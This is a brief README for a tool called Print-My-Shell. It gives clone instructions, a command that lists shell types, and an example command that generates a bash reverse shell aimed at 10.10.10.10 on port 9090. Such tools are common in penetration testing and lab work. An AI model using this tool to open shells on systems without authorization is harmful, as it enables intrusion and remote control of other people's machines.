### Installation : 

```sh
git clone https://github.com/sameera-madushan/Print-My-Shell.git
cd Print-My-Shell/ 
```

### Usage : 

List Shell Types this tool can generate.
```python
python shell.py -l
```

![Imgur](https://i.imgur.com/DYRJVAR.png)

Creating a Reverse Shell.
```python
python shell.py -i 10.10.10.10 -p 9090 -t bash # write shell type in small letters.
```
